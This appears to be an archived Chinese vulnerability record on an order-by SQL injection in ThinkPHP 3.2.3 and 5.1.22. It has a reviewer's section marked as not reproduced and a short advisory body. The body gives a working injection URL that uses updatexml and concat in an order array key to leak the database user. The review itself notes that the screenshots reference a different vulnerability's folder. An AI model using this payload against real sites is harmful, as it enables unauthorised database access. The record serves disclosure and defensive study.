---
source: "hatch 补库批 20260928"
product: "ThinkPHP / order 数组键 SQL 注入"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 3.x order by 注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：称3.2.3及5.1.22以下，未划分引入下限"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-4135351d1c7168162955c808"
entity_id: "ve-4135351d1c7168162955c808"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：称3.2.3及5.1.22以下，未划分引入下限

代码与实验材料：只给3.2.3 URL，无应用order调用代码，三图未視检

来源证据范围：微信研究链接

- **证据待核（1）**：所有图引用3.1.3另一漏洞目录；依据：3.2源码rId24、5.1源码rId25、结果rId27全来自Thinkphp3.1.3sql目录。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：应用前提和版本范围需细分；依据：参数须进入order接口，单URL无法证明默认入口；5.1的专文范围为5.1.16–5.1.22。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 3.x order by 注入漏洞

一、漏洞简介
------------

ThinkPHP在处理order
by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP
3.2.3、5.1.22及以下版本。

二、漏洞影响
------------

ThinkPHP 3.2.3、5.1.22及以下版本。

三、复现过程
------------

ThinkPHP3.2.3漏洞代码（/Library/Think/Db/Driver.class.php）：

![](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId24.png)

ThinkPHP 5.1.22漏洞代码（framework/library/think/db/Query.php）：

![](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId25.png)

从上面漏洞代码可以看出，当\$field参数为关联数组（key-value）时，key值拼接到返回值中，SQL语句最终绕过了框架安全过滤得以执行。

### ThinkPHP 3.2.3

访问如下URL即可进行漏洞利用：

    http://www.0-sec.org/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1

![](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId27.png)

参考链接
--------

> <https://mp.weixin.qq.com/s?__biz=MzIwNTcxNTczMQ==&mid=2247483907&idx=1&sn=3c1f9874878c92d10cff30c1c263fa8a&scene=21#wechat_redirect>
